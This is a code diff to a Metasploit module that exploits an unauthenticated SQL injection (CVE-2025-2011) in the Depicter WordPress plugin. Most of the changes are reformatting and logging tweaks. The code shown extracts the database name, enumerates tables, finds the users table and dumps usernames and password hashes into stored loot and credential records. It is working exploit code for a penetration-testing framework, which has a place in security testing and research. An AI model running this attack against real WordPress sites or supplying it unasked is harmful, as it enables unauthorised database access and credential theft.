@@ -14,7 +14,9 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'WordPress Depicter Plugin SQL Injection (CVE-2025-2011)',
         'Description' => %q{
-          The Slider & Popup Builder by Depicter plugin for WordPress <= 3.6.1 is vulnerable to unauthenticated SQL injection via the 's' parameter in admin-ajax.php.
+          The Slider & Popup Builder by Depicter plugin for WordPress <= 3.6.1
+          is vulnerable to unauthenticated SQL injection via the 's' parameter
+          in admin-ajax.php.
         },
         'Author' => [
           'Muhamad Visat',     # Vulnerability Discovery
@@ -27,17 +29,26 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://cloud.projectdiscovery.io/library/CVE-2025-2011'],
           ['URL', 'https://plugins.trac.wordpress.org/browser/depicter/trunk/app/src/Controllers/Ajax/LeadsAjaxController.php?rev=3156664#L179']
         ],
-        'Actions' => [['SQLi', { 'Description' => 'Perform SQL Injection via admin-ajax.php?s=' }]],
+        'Actions' => [
+          ['SQLi', { 'Description' => 'Perform SQL Injection via admin-ajax.php?s=' }]
+        ],
         'DefaultAction' => 'SQLi',
-        'DefaultOptions' => { 'VERBOSE' => true, 'COUNT' => 1 },
+        'DefaultOptions' => {
+          'VERBOSE' => true,
+          'COUNT' => 1
+        },
         'DisclosureDate' => '2025-05-08',
-        'Notes' => { 'Stability' => [CRASH_SAFE], 'SideEffects' => [IOC_IN_LOGS], 'Reliability' => [] }
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
   end
 
   def run_host(_ip)
-    print_status('Retrieving database name via SQLi...')
+    vprint_status('Retrieving database name via SQLi...')
     db_name = extract_value_from_sqli('database()')
     fail_with(Failure::UnexpectedReply, 'Failed to extract database name.') unless db_name
     vprint_good("Database name: #{db_name}")
@@ -46,12 +57,12 @@ class MetasploitModule < Msf::Auxiliary
     raw = 'group_concat(table_name) from information_schema.tables where table_schema=database()'
     tables_csv = extract_value_from_sqli(raw)
     fail_with(Failure::UnexpectedReply, 'Failed to enumerate tables.') unless tables_csv
-    print_good("Tables: #{tables_csv}")
+    vprint_good("Tables: #{tables_csv}")
 
     visible_tables = tables_csv.split(',')
     prefix = visible_tables.first.split('_').first
     users_table = "#{prefix}_users"
-    print_status("Inferred users table: #{users_table}")
+    vprint_status("Inferred users table: #{users_table}")
 
     print_status('Extracting user credentials...')
     limit = datastore['COUNT'].to_i
@@ -69,6 +80,7 @@ class MetasploitModule < Msf::Auxiliary
     data.each do |user|
       table << user
       loot_data << "Username: #{user[0]}, Password Hash: #{user[1]}\n"
+
       create_credential(
         workspace_id: myworkspace_id,
         origin_type: :service,
@@ -87,24 +99,27 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_line(table.to_s)
-    loot_path = store_loot(
-      'wordpress.users',
-      'text/plain',
-      datastore['RHOST'],
-      loot_data,
-      'wp_users.txt',
-      'WP Usernames and Password Hashes'
-    )
-    print_good("Loot saved to: #{loot_path}")
 
-    report_host(host: datastore['RHOST'])
-    report_service(
+    service = report_service(
       host: datastore['RHOST'],
       port: datastore['RPORT'],
       proto: 'tcp',
       name: fullname,
       info: description.strip
     )
+
+    loot_path = store_loot(
+      'wordpress.users',
+      'text/plain',
+      datastore['RHOST'],
+      loot_data,
+      'wp_users.txt',
+      'WP Usernames and Password Hashes',
+      service
+    )
+    print_good("Loot saved to: #{loot_path}")
+
+    report_host(host: datastore['RHOST'])
     report_vuln(
       host: datastore['RHOST'],
       port: datastore['RPORT'],
